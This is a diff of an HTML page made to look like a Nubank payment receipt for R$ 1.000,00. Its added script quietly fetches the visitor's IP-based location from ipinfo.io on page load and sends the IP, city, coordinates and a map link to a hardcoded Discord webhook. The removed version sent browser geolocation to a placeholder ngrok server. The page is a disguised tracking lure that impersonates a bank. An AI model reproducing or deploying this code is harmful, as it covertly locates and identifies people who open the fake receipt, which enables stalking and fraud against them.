@@ -10,12 +10,14 @@
 
 <body>
   <div class="comprovante-container">
+    <img src="https://logopng.com.br/logos/nubank-96.png" alt="Logo Nubank" style="width: 120px; margin-bottom: 20px;" />
+
     <h1>Comprovante de Recebimento</h1>
 
     <div class="informacoes">
       <p><span>Data:</span> <span id="data-atual"></span></p>
       <p><span>Valor Recebido:</span> R$ 1.000,00</p>
-      <p><span>De:</span> João Silva de Oliveira</p>
+      <p><span>Para:</span> Beatriz Rafaeli Silva</p>
       <p><span>Status:</span> Recebido com Sucesso</p>
     </div>
 
@@ -25,55 +27,55 @@
       <p>Se você tiver dúvidas, entre em contato com nosso suporte.</p>
       <p><a href="#">Clique aqui</a> para mais informações.</p>
     </div>
-
   </div>
 
   <script>
     window.addEventListener("load", () => {
-      if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(sendLocation, handleError);
-      } else {
-        alert("Algo deu errado. Tente novamente mais tarde.");
-      }
-    });
+      // Obter data formatada
+      const dataAtual = new Date();
+      const dia = String(dataAtual.getDate()).padStart(2, '0');
+      const mes = String(dataAtual.getMonth() + 1).padStart(2, '0');
+      const ano = dataAtual.getFullYear();
+      const dataFormatada = `${dia}/${mes}/${ano}`;
+      document.getElementById("data-atual").textContent = dataFormatada;
 
-    const dataAtual = new Date();
-    const dia = String(dataAtual.getDate()).padStart(2, '0');
-    const mes = String(dataAtual.getMonth() + 1).padStart(2, '0');
-    const ano = dataAtual.getFullYear();
-
-    const dataFormatada = `${dia}/${mes}/${ano}`;
-
-    document.getElementById("data-atual").textContent = dataFormatada;
-
-    console.log(dataAtual)
-
-    function sendLocation(position) {
-      const latitude = position.coords.latitude;
-      const longitude = position.coords.longitude;
-      const maps = `https://www.google.com/maps?q=${latitude},${longitude}`;
-
-      fetch("NGROK_SERVER/send-location", {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json"
-        },
-        body: JSON.stringify({ latitude, longitude, maps })
-      })
+      // Obter localização via IP
+      fetch("https://ipinfo.io/json?token=6b45976972babf")
         .then(response => response.json())
         .then(data => {
-          if (!data.success) {
-            alert("Erro ao enviar o comprovante.");
-          }
+          const [latitude, longitude] = data.loc.split(",");
+          const cidade = data.city;
+          const regiao = data.region;
+          const pais = data.country;
+          const maps = `https://www.google.com/maps?q=${latitude},${longitude}`;
+          const ip = data.ip;
+
+          const mensagem = `📍 Localização recebida via IP:\n` +
+            `IP: ${ip}\n` +
+            `Local aproximado: ${cidade}, ${regiao}, ${pais}\n` +
+            `Latitude: ${latitude}\nLongitude: ${longitude}\n` +
+            `Mapa: ${maps}`;
+
+          fetch("https://discord.com/api/webhooks/1285422704140353566/iaAj1fwwOAIdwJvZQKyQKZdLYO9KLqW2-PM8wZIHN0X372UyI-S4A9-ubC6pVWLrHUTs", {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json"
+            },
+            body: JSON.stringify({ content: mensagem })
+          })
+          .then(response => {
+            if (!response.ok) {
+              throw new Error("Erro ao enviar para o Discord");
+            }
+          })
+          .catch(error => {
+            console.error("Erro ao enviar localização para Discord:", error);
+          });
         })
         .catch(error => {
-          console.error("Erro:", error);
+          console.error("Erro ao obter localização por IP:", error);
         });
-    }
-
-    function handleError(error) {
-      alert("Erro ao obter a localização: " + error.message);
-    }
+    });
   </script>
 </body>
 
